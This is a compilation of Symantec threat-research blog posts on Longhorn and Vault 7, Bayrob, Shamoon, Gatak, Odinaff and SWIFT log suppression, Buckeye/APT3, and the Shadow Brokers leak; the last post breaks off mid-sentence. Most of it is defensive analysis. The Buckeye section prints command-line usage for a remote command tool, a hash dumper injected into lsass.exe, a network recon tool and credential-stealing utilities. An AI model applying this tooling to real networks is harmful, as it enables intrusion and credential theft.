    "text": "Spying tools and operational protocols detailed in the recent Vault 7 leak have been used in cyberattacks against at least 40 targets in 16 different countries by a group Symantec calls Longhorn. Symantec has been protecting its customers from Longhorn’s tools for the past three years and has continued to track the group in order to learn more about its tools, tactics, and procedures. The tools used by Longhorn closely follow development timelines and technical specifications laid out in documents disclosed by WikiLeaks. The Longhorn group shares some of the same cryptographic protocols specified in the Vault 7 documents, in addition to following leaked guidelines on tactics to avoid detection. Given the close similarities between the tools and techniques, there can be little doubt that Longhorn's activities and the Vault 7 documents are the work of the same group. Longhorn has been active since at least 2011. It has used a range of back door Trojans in addition to zero-day vulnerabilities to compromise its targets. Longhorn has infiltrated governments and internationally operating organizations, in addition to targets in the financial, telecoms, energy, aerospace, information technology, education, and natural resources sectors. All of the organizations targeted would be of interest to a nation-state attacker. Longhorn has infected 40 targets in at least 16 countries across the Middle East, Europe, Asia, and Africa. On one occasion a computer in the United States was compromised but, following infection, an uninstaller was launched within hours, which may indicate this victim was infected unintentionally. A number of documents disclosed by WikiLeaks outline specifications and requirements for malware tools. One document is a development timeline for a piece of malware called Fluxwire, containing a changelog of dates for when new features were incorporated. These dates align closely with the development of one Longhorn tool (Trojan. Corentry) tracked by Symantec. New features in Corentry consistently appeared in samples obtained by Symantec either on the same date listed in the Vault 7 document or several days later, leaving little doubt that Corentry is the malware described in the leaked document. Early versions of Corentry seen by Symantec contained a reference to the file path for the Fluxwire program database (PDB) file. The Vault 7 document lists removal of the full path for the PDB as one of the changes implemented in Version 3.5.0. Up until 2014, versions of Corentry were compiled using GCC. According to the Vault 7 document, Fluxwire switched to a MSVC compiler for version 3.3.0 on February 25, 2015. This was reflected in samples of Corentry, where a version compiled on February 25, 2015 had used MSVC as a compiler. A second Vault 7 document details Fire and Forget, a specification for user-mode injection of a payload by a tool called Archangel. The specification of the payload and the interface used to load it was closely matched in another Longhorn tool called Backdoor. Plexor. A third document outlines cryptographic protocols that malware tools should follow. These include the use of inner cryptography within SSL to prevent man-in-the-middle (MITM) attacks, key exchange once per connection, and use of AES with a 32-byte key. These requirements align with the cryptographic practices observed by Symantec in all of the Longhorn tools. Other Vault 7 documents outline tradecraft practices to be used, such as use of the Real-time Transport Protocol (RTP) as a means of command and control (C&C) communications, employing wipe-on-use as standard practice, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and the use of secure erase protocols involving renaming and overwriting. Symantec has observed Longhorn tools following all of these practices. While other malware families are known to use some of these practices, the fact that so many of them are followed by Longhorn makes it noteworthy. While active since at least 2011, with some evidence of activity dating back as far as 2007, Longhorn first came to Symantec’s attention in 2014 with the use of a zero-day exploit (CVE-2014-4148) embedded in a Word document to infect a target with Plexor. The malware had all the hallmarks of a sophisticated cyberespionage group. Aside from access to zero-day exploits, the group had preconfigured Plexor with elements that indicated prior knowledge of the target environment. To date, Symantec has found evidence of Longhorn activities against 40 targets spread across 16 different countries. Symantec has seen Longhorn use four different malware tools against its targets: Corentry, Plexor, Backdoor. Trojan. LH1, and Backdoor. Trojan. LH2. Before deploying malware to a target, the Longhorn group will preconfigure it with what appears to be target-specific code words and distinct C&C domains and IP addresses for communications back to the attackers. Longhorn tools have embedded capitalized code words, internally referenced as “groupid” and “siteid”, which may be used to identify campaigns and victims. Over 40 of these identifiers have been observed, and typically follow the theme of movies, characters, food, or music. One example was a nod to the band The Police, with the code words REDLIGHT and ROXANNE used. Longhorn’s malware has an extensive list of commands for remote control of the infected computer. Most of the malware can also be customized with additional plugins and modules, some of which have been observed by Symantec. Longhorn’s malware appears to be specifically built for espionage-type operations, with detailed system fingerprinting, discovery, and exfiltration capabilities. The malware uses a high degree of operational security, communicating externally at only select times, with upload limits on exfiltrated data, and randomization of communication intervals—all attempts to stay under the radar during intrusions. For C&C servers, Longhorn typically configures a specific domain and IP address combination per target. The domains appear to be registered by the attackers; however they use privacy services to hide their real identity. The IP addresses are typically owned by legitimate companies offering virtual private server (VPS) or webhosting services. The malware communicates with C&C servers over HTTPS using a custom underlying cryptographic protocol to protect communications from identification. Prior to the Vault 7 leak, Symantec’s assessment of Longhorn was that it was a well-resourced organization which was involved in intelligence gathering operations. This assessment was based on its global range of targets and access to a range of comprehensively developed malware and zero-day exploits. The group appeared to work a standard Monday to Friday working week, based on timestamps and domain name registration dates, behavior which is consistent with state-sponsored groups. Symantec’s analysis uncovered a number of indicators that Longhorn was from an English-speaking, North American country. The acronym MTWRFSU (Monday Tuesday Wednesday ThuRsday Friday Saturday SUnday) was used to configure which day of the week malware would communicate with the attackers. This acronym is common in academic calendars in North America. Some of the code words found in the malware, such as SCOOBYSNACK, would be most familiar in North America. In addition to this, the compilation times of tools with reliable timestamps indicate a time zone in the Americas. Longhorn has used advanced malware tools and zero-day vulnerabilities to infiltrate a string of targets worldwide. Taken in combination, the tools, techniques, and procedures employed by Longhorn are distinctive and unique to this group, leaving little doubt about its link to Vault 7. Throughout its investigation of Longhorn, Symantec’s priority has been the protection of its customers. Through identifying different strains of Longhorn malware, connecting them to a single actor, and learning more about the group’s tactics and procedures, Symantec has been able to better defend customer organizations against this and similar threats. In publishing this new information, Symantec’s goal remains unchanged: to reassure customers that it is aware of this threat and actively working to protect them from it.

    "text": "Three Romanian men have been indicted in the US for allegedly operating a longstanding fraud operation known as Bayrob that conned victims out of millions of dollars. Bogdan Nicolescu (aka “Masterfraud”, aka “mf”); Danet Tiberiu (aka “Amightysa”, aka “amy”); and Radu Miclaus (aka “Minolta”, aka “min”) were arrested by police in Romania earlier this year before being extradited to the US, where they now face multiple charges relating to fraud, identity theft, money laundering, and trafficking in counterfeit goods or services. Our research shows that the Bayrob gang are career cybercriminals, earning a living from online fraud. They specialize in detailed scams and go to great lengths to craft convincing emails and create fake websites, voice messages, and even customer support chatrooms in order to dupe victims. The gang began its career running elaborate cons where it created fake vehicle auctions to defraud victims out of tens of thousands of dollars. It later expanded and diversified with a number of different fraud and malware operations, ranging from credit card theft to cryptocurrency mining using infected computers. The FBI believes that the Bayrob group has stolen at least US$4 million from victims over the past eight years, though the actual total may be up to $35 million. It also established that the group infected between 60,000 and 160,000 computers and sent out 11 million malicious emails. The arrests are the culmination of an eight-year law enforcement investigation which was assisted by Symantec. During this time, Symantec discovered multiple versions of Bayrob malware, collected helpful intelligence data, and witnessed Bayrob as it morphed from online fraud to a 300,000+ botnet for cryptocurrency mining. Symantec succeeded in exposing the gang’s operations, gaining insight into its key players, tactics, malware, and the potential impact and criminal activity undertaken. Bayrob first came to our attention in 2007, when it was discovered operating a scam that conned victims into believing they were buying a vehicle on eBay. Victims’ computers were infected with custom designed malware (Trojan. Bayrob) which displayed fake eBay web pages and misled users into thinking they were conducting a legitimate purchase on the auction site. The gang identified potential victims by listing vehicles for sale on a number of websites, including eBay and classified advertising websites. It noted anyone who displayed an interest in the sale, such as those who asked questions or put a bid on the vehicle. The gang would then pretend that the sale had concluded but later email potential victims, informing them that the sale had fallen through and asking if they were still interested. Attached to these emails was a slideshow file, containing pictures of the vehicle supposedly on sale. This file was infected with Trojan. Bayrob. If the victim opened it, the malware was installed on their computer. Once the attackers verified that the Bayrob Trojan was running on a victim’s computer, they moved on to the next stage of the scam by sending an email with what they claimed was a link to a new auction for the vehicle. It was at this point that the Trojan came into play. If the victim clicked on the link, it would redirect them to a fake eBay page. If they decided to buy the vehicle, they were asked to pay by way of a bank transfer, which was routed to an account that belonged to a money mule, who would in turn transfer the proceeds of the fraud to the gang. From the victim’s standpoint it appeared they were visiting a real eBay auction. However, if the link was followed from an uninfected computer, there would be no such auction. The gang went to great lengths to make the scam appear realistic. Its emails were composed in fluent English and every iteration of the Bayrob Trojan was customized for its intended victim. The fake eBay web pages even included fictitious feedback about the seller. The Trojan was also capable of generating fake vehicle history reports, along with fake pages from escrow and delivery services. The fraud had a major impact on its victims, who often transferred thousands of dollars thinking they were paying for a new car and ended up with nothing. Bayrob’s activities were initially exposed by Symantec in 2007, when wepublished a series of blogshighlighting the eBay scam, and several media outlets reported on their activities. The gang reacted angrily and, for a while, registered command and control (C&C) domain names that contained abusive references to our researchers and made disparaging references to Symantec in its code. However, public attention didn’t deter the gang from further expanding and refining its operations. For example, they created a fake trucking company, which was used to supposedly transport purchased vehicles to their victims. The trucking company would first inform the victim their vehicle was on the way and then later email them informing them of delays. It even operated a phone line and fake voicemail service to appear more convincing. The whole purpose of the fake trucking company was to string the victim along for as long as possible in order to make sure the gang received the money before the victim realized they’d been conned. In order to move the proceeds of its scams back to Romania, the gang recruited a wide network of money mules. It found potential mules by spamming classified advertising websites with fake job ads. Rather than the usual cybercriminal tactic of using “work from home” ads, the Bayrob gang often copied legitimate job ads in order appear more convincing. Those who responded were told that the job had been filled but were then offered an alternative, work from home job. As with its other operations, money mule recruitment was professionally executed and backed up by a series of fake websites and convincing looking emails, such as one purporting to offer the recipient a job with a technology company. Some victims were even told they’d gotten a job with a fake Yahoo subsidiary called Yahoo Transfers. Given that they would be handling the gang’s stolen money, mules were thoroughly vetted during recruitment, using Google searches, instant messaging, and VoIP calls. The group recruited mules on both sides of the Atlantic. Victims in the US were instructed to route payments to a bank account controlled by a mule in the US. These in turn were asked to transfer the money to another mule, usually in an Eastern European country. They would then presumably transfer the money on to gang members. Mules in the US were often vulnerable people in difficult circumstances. They appeared to be unwitting pawns of the gang, unaware of what they’d become involved with. Less is known about the money mules used in Europe, but most appeared to collect transferred funds using fake identities, indicating they may have been more complicit in the gang’s activities. Mules in the US were given two options for payment. They could keep six percent of the funds they transferred or they could send the entire amount and later receive a check for 10 percent of the total. The latter option was a scam and nobody who opted for it received any payment from the gang. Despite putting these money mules at risk of arrest and prosecution, the gang had no qualms about double-crossing them and stealing from them too. Over time, the Bayrob gang expanded beyond its original auction fraud and into other areas of cybercrime. The group began stealing credit card information from the users of infected computers, using the stolen cards to finance the purchase of online infrastructure and services that allowed it to grow its operations. In recent years, the gang has concentrated on rapidly growing the number of infected computers in order to build a botnet. When it was exclusively involved in auction fraud, the number of infected computers was around 1,000 at any one time. However, by 2014 it had jumped to approximately 50,000 and by mid-2016 it had grown to over 300,000 and continued to grow. One of the main purposes of this botnet appeared to be cryptocurrency mining. A large number of infected computers provided the gang with the necessary processing power to profit significantly from mining. Since 2011, Symantec has managed to progressively uncover the gang’s network, gaining a broad picture of its operations. The information generated by our investigation not only helped us to improve our protections against the group’s malware, but also allowed us to prevent future attacks and warn potential victims. What we learned assisted the FBI in its investigation and we opted not to publish what we discovered in recent years until the FBI investigation was concluded. Bayrob employed a high degree of internal security. Their online communications involved extensive use of encryption, with email encrypted using PGP and instant messaging encrypted with the Off-The-Record (OTR) messaging protocol. In order to cover its tracks, the gang hid behind a double layer of proxies, connecting first to proxies in Romania and then to more proxies in the US. One of our most significant breakthroughs came when we discovered a weak point in their use of these proxies. Due to this weakness, the gang's malicious activities were exposed, allowing us to passively observe its activities on computers Symantec was protecting. Our investigation required time and patience. In one case, we observed the gang’s malicious activities for a year and a half before it made an error that exposed one of its suspected members. Over time we came to understand the group’s infrastructure which helped us to get see more of the gang’s operations. Symantec’s pursuit of Bayrob is one of many long-standing investigations we currently have underway, all of which are motivated by a desire to protect our customers. Today’s arrests illustrate the value of effective co-operation between security companies and law enforcement and sends a clear signal to international cybercrime gangs that they are not beyond the reach of the justice system. Symantec products use multiple layers over protection against Bayrob’s malware. Protection has been continuously updated since 2007 to block against each new iteration of the group’s malware. Symantec and Norton products block Bayrob malware with the following detections: Intrusion prevention system In addition to this, a range of Symantec generic detections also successfully block Bayrob malware. The addition of generic detections to our defense layer makes it more difficult for attackers to identify which detections are designed to specifically block their malware, making it hard to test against them. Symantec has gathered full technical details and indicators of compromise for all Bayrob malware variants discovered since 2007. This can be supplied to any member of the information security community upon request.

    "text": "Shamoon (W32. Disttrack), the aggressive disk-wiping malware which was used in attacks against the Saudi energy sector in 2012, has made a surprise comeback and was used in a fresh wave of attacks against targets in Saudi Arabia. The malware used in the recent attacks (W32. Disttrack. B) is largely unchanged from the variant used four years ago. In the 2012 attacks, infected computers had their master boot records wiped and replaced with an image of a burning US flag. The latest attacks instead used a photo of the body of Alan Kurdi, the three year-old Syrian refugee who drowned in the Mediterranean last year. The attackers appear to have done a significant amount of preparatory work for the operation. The malware was configured with passwords that appear to have been stolen from the targeted organizations and were likely used to allow the threat to spread across a targeted organization’s network. How the attackers obtained the stolen credentials is unknown. The malware had a default configuration that triggered the disk-wiping payload at 8:45pm local time on Thursday, November 17. The Saudi Arabian working week runs from Sunday to Thursday. It would appear that the attack was timed to occur after most staff had gone home for the weekend in the hope of reducing the chance of discovery before maximum damage could be caused. Shamoon uses a number of components to infect computers. The first component is a dropper, which creates a service with the name ‘NtsSrv’ to remain persistent on the infected computer. It spreads across a local network by copying itself on to other computers and will drop additional components to infected computers. The dropper comes in 32-bit and 64-bit versions. If the 32-bit dropper detects a 64-bit architecture, it will drop the 64-bit version. The second component is the wiper, which drops a third component, known as the Eldos driver. This enables access to the hard disk directly from user-mode without the need of Windows APIs. The wiper uses the Eldos driver to overwrite the hard disk with the aforementioned photos of the Syrian boy. The final component is the reporter. This is responsible for handling communications with a command and control (C&C) server operated by the attackers. It can download additional binaries from the C&C server and change the pre-configured disk-wiping time if instructed by the C&C server. It is also configured to send a report verifying that a disk has been wiped to the C&C server. Although attacks involving destructive malware such as Shamoon are relatively rare, they can be highly disruptive for the targeted organization, potentially knocking mission-critical computers offline. Why Shamoon has suddenly returned again after four years is unknown. However, with its highly destructive payload, it is clear that the attackers want their targets to sit up and take notice. Symantec and Norton products protect against Shamoon with the following detections: Intrusion prevention system The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "The group behind the Gatak Trojan (Trojan. Gatak) continues to pose a threat to organizations, with the healthcare sector in particular heavily affected by attacks. Gatak is known for infecting its victims through websites promising product licensing keys for pirated software. While the group focused on US targets, it has diversified over the past two years and attacks are now taking place against organizations in a broad range of countries. The majority of Gatak infections (62 percent) occur on enterprise computers. Analysis of recent enterprise attacks indicates that the healthcare sector is by far the most affected by Gatak. Of the top 20 most affected organizations (organizations with the most infected computers), 40 percent were in the healthcare sector. In the past, the insurance sector was also heavily targeted by the group. Gatak victims are infected using websites offering product key generators or “keygens” for pirated software. The malware is bundled with the product key and, if the victim is tricked into downloading and opening one of these files, the malware is surreptitiously installed on their computer. The attackers appear to focus on offering product keys for software that is more likely to be used in professional environments. The websites used in the attacks are controlled by the attackers and have no connection with the developers of the software. At no point are legitimate versions of software compromised. Among the software brands used as lures were: The product keys downloaded from these websites do not work and simply generate pseudo-random sequence of characters. This means all the victim gets from the download is a junk file and a potential Gatak infection. The Gatak Trojan (aka Stegoloader) has been used in attacks since at least 2011. There are two main components of the malware. A lightweight deployment module (Trojan. Gatak. B) can perform detailed system fingerprinting on infected computers and selectively install additional payloads. The main module (Trojan. Gatak) is a fully fledged back door Trojan, which maintains a persistent presence on an infected computer and steals information from it. A notable feature of Gatak is its use of steganography, a technique for hiding data within image files. When Gatak is installed on a computer, it attempts to download a PNG image file from one of a number of URLs hardcoded into the malware. The image looks like an ordinary photograph, but contains an encrypted message within its pixel data. The Gatak Trojan is capable of decrypting this message, which contains commands and files for execution. In approximately 62 percent of incidents, lateral movement across the victim’s network occurs within two hours of infection. In the remaining cases, lateral movement began at some point after the two hour mark. The variance indicates that lateral movement isn’t automated and instead carried out manually by the attackers. Whether the attackers don’t have the resources to exploit all infections immediately or whether they prioritize some infections over others is unknown. Little is known about how the attackers move across an organization’s network. The most likely explanation is that they exploit weak passwords and poor security in file shares and network drives. There is no evidence of zero-day exploits or sophisticated hacking tools being employed. In some cases, the attackers have infected computers with other malware, including various ransomware variants and the Shylock (Trojan. Shylock) financial Trojan. In the case of Shylock, these appear to be older versions of the threat and might even be “false flag” infections. They may be used by the group when they believe their attack has been uncovered, in order to throw investigators off the scent. Little is known about the group behind Gatak, although the corporate nature of its targets, along with the absence of zero-day vulnerabilities or advanced malware modules suggest that it may be cybercriminal in nature, however there are also capabilities within the malware for more traditional espionage operations. It is unclear how Gatak is profiting from its attacks. One possibility is data theft, with the attackers selling personally identifiable information and other stolen data on the cyberunderground. This could explain the attackers’ heavy focus on the healthcare sector, with healthcare records usually selling for more than other personal information. However, Gatak’s means of distribution, through keygen websites, indicates that the attackers may be more opportunistic. By using a watering-hole approach, the attackers play a largely passive role, with relatively little control over who is infected. If this is the case, the healthcare sector may simply be the most susceptible to these kinds of attacks. Healthcare organizations can often be pressurized, under-resourced, and many use legacy software systems that are expensive to upgrade. Consequently, workers could be more likely to take shortcuts and install pirated software. While organizations in other sectors appear to be infected less frequently, the attackers don’t appear to ignore or remove these infections when they occur. Since it first appeared five years ago the Gatak group has carried out a steady stream of attacks and the Trojan represents a serious threat to any organization, particularly in the healthcare sector. Gatak provides a timely reminder that the use of pirated software can compromise security in addition to creating legal issues for an organization. Along with using a robust security solution, organizations should regularly audit the software used on their network and educate staff about the dangers of using pirated or unapproved software. Symantec and Norton products protect against this threat with the following detections: Intrusion prevention system: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "Since January 2016, discreet campaigns involving malware called Trojan. Odinaff have targeted a number of financial organizations worldwide. These attacks appear to be extremely focused on organizations operating in the banking, securities, trading, and payroll sectors. Organizations who provide support services to these industries are also of interest. Odinaff is typically deployed in the first stage of an attack, to gain a foothold onto the network, providing a persistent presence and the ability to install additional tools onto the target network. These additional tools bear the hallmarks of a sophisticated attacker which has plagued the financial industry since at least 2013–Carbanak. This new wave of attacks has also used some infrastructure that has previously been used in Carbanak campaigns. These attacks require a large amount of hands on involvement, with methodical deployment of a range of lightweight back doors and purpose built tools onto computers of specific interest. There appears to be a heavy investment in the coordination, development, deployment, and operation of these tools during the attacks. Custom malware tools, purpose built for stealthy communications (Backdoor. Batel), network discovery, credential stealing, and monitoring of employee activity are deployed. Although difficult to perform, these kinds of attacks on banks can be highly lucrative. Estimates of total losses to Carbanak-linked attacks range from tens of millions to hundreds of millions of dollars. Attacks involving Odinaff appear to have begun in January 2016. The attacks have hit a wide range of regions, with the US the most frequently targeted. It was followed by Hong Kong, Australia, the UK and Ukraine. Most Odinaff attacks were against financial targets. In attacks where the nature of the victim’s business was known, financial was by far the most frequently hit sector, accounting for 34 percent of attacks. There were a small number of attacks against organizations in the securities, legal, healthcare, government and government services targets; however, it is unclear whether all of these were financially motivated. Around 60 percent of attacks were against targets whose business sector was unknown, but in many cases these were against computers running financial software applications, meaning the attack was likely financially motivated. The Odinaff attackers’ use a variety of methods to break into the networks of targeted organizations. One of the most common methods of attack is through lure documents containing a malicious macro. If the recipient opts to enable macros, the macro will install the Odinaff Trojan on their computer. Another attack involves the use of password-protected RAR archives, in order to lure the victims into installing Odinaff on their computers. Although Symantec has not seen how these malicious documents or links are distributed, we believe spear-phishing emails are the most likely method. Trojan. Odinaff has also been seen to be distributed through botnets, where the Trojan is pushed out to computers already infected with other malware, such as Andromeda (Downloader. Dromedan) and Snifula (Trojan. Snifula). In the case of Andromeda, this was bundled as a Trojanized installer for AmmyyAdmin, a legitimate remote administration tool. The Trojanized installer was downloaded from the official website, which has been targeted repeatedly in recent times to spread a number of different malware families. Odinaff is a relatively lightweight back door Trojan that connects to a remote host and looks for commands every five minutes. Odinaff has two key functions: it can download RC4 encrypted files and execute them and it can also issue shell commands, which are written to a batch file and then executed. Given the specialist nature of these attacks, a large amount of manual intervention is required. The Odinaff group carefully manages its attacks, maintaining a low profile on an organization’s network, downloading and installing new tools only when needed. Trojan. Odinaff is used to perform the initial compromise, while other tools are deployed to complete the attack. A second piece of malware known as Batle (Backdoor. Batel) is used on computers of interest to the attackers. It is capable of running payloads solely in memory, meaning the malware can maintain a stealthy presence on infected computers. The attackers make extensive use of a range of lightweight hacking tools and legitimate software tools to traverse the network and identify key computers. These include: The group also appears to have developed malware designed to compromise specific computers. The build times for these tools were very close to the time of deployment. Among them were components capable of taking screenshot images at intervals of between five and 30 seconds. Symantec has found evidence that the Odinaff group has mounted attacks on SWIFT users, using malware to hide customers’ own records of SWIFT messages relating to fraudulent transactions. The tools used are designed to monitor customers’ local message logs for keywords relating to certain transactions. They will then move these logs out of customers’ local SWIFT software environment. We have no indication that SWIFT network was itself compromised. These “suppressor” components are tiny executables written in C, which monitor certain folders for files that contain specific text strings. Among the strings seen by Symantec are references to dates and specific International Bank Account Numbers (IBANs). The folder structure in these systems seem to be largely user defined and proprietary, meaning each executable appears to be clearly tailored to for a target system. One of the files found along with the suppressor was a small disk wiper which overwrites the first 512 bytes of the hard drive. This area contains the Master Boot Record (MBR) which is required for the drive to be accessible without special tools. We believe this tool is used to cover the attackers’ tracks when they abandon the system and/or to thwart investigations. These Odinaff attacks are an example of another group believed to be involved in this kind of activity, following the Bangladesh central bank heist linked to the Lazarus group. There are no apparent links between Odinaff’s attacks and the attacks on banks’ SWIFT environments attributed to Lazarus and the SWIFT-related malware used by the Odinaff group bears no resemblance to Trojan. Banswift, the malware used in the Lazarus-linked attacks. The attacks involving Odinaff share some links to the Carbanak group, whose activities became public in late 2014. Carbanak also specializes in high-value attacks against financial institutions and has been implicated in a string of attacks against banks in addition to point of sale (PoS) intrusions. Aside from the similar modus operandi, there are a number of other links between Carbanak and Odinaff: Since Carbanak’s main Trojan, Anunak (Trojan. Carberp. B and Trojan. Carberp. D) was never observed in campaigns involving Odinaff, we firmly believe the group uses a number of discreet distribution channels to compromise financial organizations. While it is possible that Odinaff is part of the wider organization, the infrastructure crossover is atypical, meaning it could also be a similar or cooperating group. The discovery of Odinaff indicates that banks are at a growing risk of attack. Over the past number of years, cybercriminals have begun to display a deep understanding of the internal financial systems used by banks. They have learned that banks employ a diverse range of systems and have invested time in finding out how they work and how employees operate them. When coupled with the high level of technical expertise available to some groups, these groups now pose a significant threat to any organization they target. Symantec and Norton products detect these threats as: Bluecoat products will: The following are examples of the various tools in use: Odinaff document droppers SWIFT log suppressors Backdoor. Batel RTF document dropper Backdoor. Batel stagers Older Batel *. CPL droppers Cobalt Strike, possible ATM implants Cobalt Strike implants Backdoor.

    "text": "Buckeye (also known as APT3, Gothic Panda, UPS Team, and TG-0110) is a cyberespionage group that is believed to have been operating for well over half a decade. Traditionally, the group attacked organizations in the US as well as other targets. However, Buckeye’s focus appears to have changed as of June 2015, when the group began compromising political entities in Hong Kong. Since March 2016, the group has appeared to mostly focus on organizations in Hong Kong, sending malicious emails to targets as recently as August 4, and attempting to spread within compromised networks in order to steal information. Using the combined threat intelligence of Symantec and Blue Coat Systems, we have built a clear and concise picture of how Buckeye has evolved its tactics in recent years. This has allowed us to further enhance our protection capabilities against the group’s campaigns. Symantec has observed Buckeye activity dating back to 2009, involving attacks on various organizations in several regions. Buckeye used a remote access Trojan (Backdoor. Pirpi) in attacks against a US organization’s network in 2009. The group delivered Backdoor. Pirpi through malicious attachments or links in convincing spear-phishing emails. Symantec has identified additional tools used by the group, which will be discussed later. Buckeye has been known to exploit zero-day vulnerabilities in the past, such asCVE-2010-3962in an campaign in 2010 and CVE-2014-1776 in 2014. Although other zero-day attacks have been reported, they have not been confirmed by Symantec. All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash. More recently, Symantec telemetry has revealed Backdoor. Pirpi connections from compromised computers based in Hong Kong dating back to August 2015. The infections significantly increased in number towards the end of March 2016 and the beginning of April 2016. Additional investigations discovered related malware samples and determined that targeted organizations were political entities in Hong Kong. In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment. The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo. Clicking on the shortcut ultimately leads to Backdoor. Pirpi being downloaded and executed on the affected computer. From 2015 to date, Symantec identified approximately 82 organizations in various regions that had Buckeye tools present on their network. However, this is not an accurate picture of the targets of interest to Buckeye. The group casts a wide net while trawling for targets but only remains active on the networks of organizations it is interested in. Symantec determined a more accurate picture of Buckeye’s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers. After these filters were applied to our data, we found a total of 17 organizations, located in Hong Kong (13), the US (3), and the UK (1). It should be noted that this data goes back to 2015 and that the proportion of targets in Hong Kong from March 2016 would be considerably higher. Up to mid-2015, Buckeye’s traditional targets were varying categories of US organizations, which match the types of victims seen in the UK. Buckeye interests changed substantially around June 2015 when the group began infecting organizations in Hong Kong. Infections in the UK and US ceased shortly after this time. Buckeye uses a number of hacking tools as well as malware. Many of the hacking tools are open source applications that have been patched or modified in some manner by Buckeye in an attempt to evade detection. Buckeye uses Backdoor. Pirpi, a remote access Trojan capable of reading, writing, and executing files and programs. Backdoor. Pirpi also collects information about the target’s local network, including the domain controller and workstations. As mentioned previously, Buckeye also uses a number of hacking tools, including the following: Keylogger: The keylogger is configured using the command line parameters: NetworkService, Replace, Install, Register and Unregister. These parameters install it as a service. The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx. It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway. RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool. Usage is: %s shareIp domain[USER INFORMATION|[USER NAME AND PASSWORD]] [/run:[COMMAND]] The commands to be passed consist of upload, download, Service (create, delete, start, stop), delete, rename, andAT PwDumpVariant: This tool imports lsremora.dll (often downloaded by the attacker as part of the toolset) and uses the GetHash export of this DLL. On execution, the tool injects itself into lsass.exe and is triggered with the argument “dig”. OSinfo: OSInfo is a general purpose, system information gathering tool. It has the following command line argument help: info <Server/Domain> [options][options]:-d Domain-o OsInfo-t TsInfo-n NetuseInfo-s ShareInfo ShareDir-c Connect Test-a Local And Global Group User Info-l Local Group User Info-g Global Group User Info-ga Group Administrators-gp Group Power Users-gd Group Domain Admins-f <infile> //input server list from infile, OneServerOneLineinfo <\\\\server> <user> ChromePass: A tool from NirSoft used for recovering passwords stored in the Chrome browser. Lazagne: A compiled Python tool that extracts passwords from various locally installed application classes, such as web browsers. The full list is: chats, svn, wifi, mails, windows, database, sysadmin, and browsers. Buckeye seems to target file and print servers, which makes it likely the group is looking to steal documents. This, coupled with the group’s use of zero-day exploits in the past, customized tools, and the types of organizations being targeted would suggest that Buckeye is a state-sponsored cyberespionage group. Symantec, Norton, and Blue Coat products protect against the activities of this cyberespionage group.

    "text": "An attack group calling itself the Shadow Brokers has released a trove of data it claims to have stolen from the Equation cyberespionage group. The data contains a range of exploits and tools the attack group state were used by Equation. The Shadow Brokers said that the data dump was a sample of what had been stolen from hacking Equation and that the “best” files would be auctioned off to the highest bidder. Equation was uncovered last year, when it was found to be using highly advanced malware tools to target organizations in a range of countries. The group is technically competent and well resourced, using highly developed malware tools that go to great lengths to evade detection. Symantec Security Response is analyzing the data released by Shadow Brokers in order to assess the accuracy of the group's claims and will update our malware and exploit protections if necessary. Q: How much data has been released? A: Shadow Brokers released a 256-megabyte compressed archive containing around 4,000 files. Q: What kinds of files are in the archive? A: The files mainly appear to be installation scripts, configuration files, and exploits targeting a range of routers and firewall appliances. Q: How old is the data? A: Most of the files appear to be several years old, dating back to between 2010 and 2013. Q: Does the data dump actually contain working exploits? A: It will take some time to assess all of the released files. However, early indications are that at least some of the tools released are functioning exploits. Q: What do we know about Shadow Brokers? A: The group has no prior history. While it may be previously unknown, “Shadow Brokers” could also be a cover name for another group. Q: What do we know about the unreleased data held by the group? A: Very little. It has said it is keeping this a secret and simply claimed that it contains the “best” files. Q: How will it auction the unreleased data? A: The group provided a Bitcoin address and instructed interested parties to send Bitcoin to it. Losing bids would not be refunded and instead losing bidders would be granted “consolation prizes”. It claimed it was seeking to raise the incredibly large sum of 1 million Bitcoin (US$576.3 million) and, if it received this, it would publicly release more data. Q: Is it possible this is a hoax? A: While the files released are certainly not junk, it will take some time to fully establish if they are definitely linked to the Equation group. Q: Does the data dump have links to any known tools? A: Some of the files reference alleged US National Security Agency (NSA) tools named in the Edward Snowden leaks, e.g. “EPIC BANANA”, “EXTRA BACON”, and “ELIGIBLE CONTESTANT.” However, since these names were already public information it doesn’t provide proof of the files’ origin. Update – August 18, 2016: Q: There have been reports that leaked files contain a unique implementation of the RC5/RC6 encryption algorithm that has previously only been seen in Equation Group malware. Can you corroborate this? A: We don’t believe this can prove a definite link between the two. The RC5/RC6 implementations are similar, in that some values used for instantiating the algorithm in their implementation were negated. However, further analysis by Symantec found a large number of files previously seen in the wild where these values were also present. We believe that the negated values might be an optimization introduced by the compiler used. In short, the similarities could have come about by accident rather than design. Q: Have patches been released for any of the vulnerabilities disclosed in the leak? A: To date, Cisco and Fortinet have issued security updates after exploits for their products were found in the leak. Cisco saidthat the leaked files contained exploits of two vulnerabilities affecting a number of its products: the Cisco ASA (Adaptive Security Appliance) and legacy Cisco PIX firewalls. The company has issued security advisories for both: Cisco said that the while CVE-2016-6366 was a newly discovered vulnerability, CVE-2016-6367 had been fixed in 2011. Meanwhile Fortinet has published asecurity advisoryabout a cookie parser buffer overflow vulnerability which it said affected older versions of its FortiGate (FOS) firmware, versions 4.3.8 and below. Customers are advised to upgrade to release 5.x or upgrade to 4.3.9 or above for models not compatible with 5.x. Q: Did the leak include any exploits for Symantec products? A: No exploits of Symantec products were found in the released files. Our investigation is still in progress. Update – August 23, 2016: Q: Are Juniper Networks products affected by the leak? A: Juniper Networks has said the leakincluded tools targeting its NetScreen devices. “As part of our analysis of these files, we identified an attack against NetScreen devices running ScreenOS,” a Juniper Networks spokesperson said. “We are examining the extent of the attack, but initial analysis indicates it targets the boot loader and does not exploit a vulnerability on ScreenOS devices.” The company said it would continue its analysis and publish any new information in a blog or security advisory once more is known. Q: Has any money been sent to the Shadow Brokers yet? A: Records associated with the Bitcoin address provided by the Shadow Brokers show 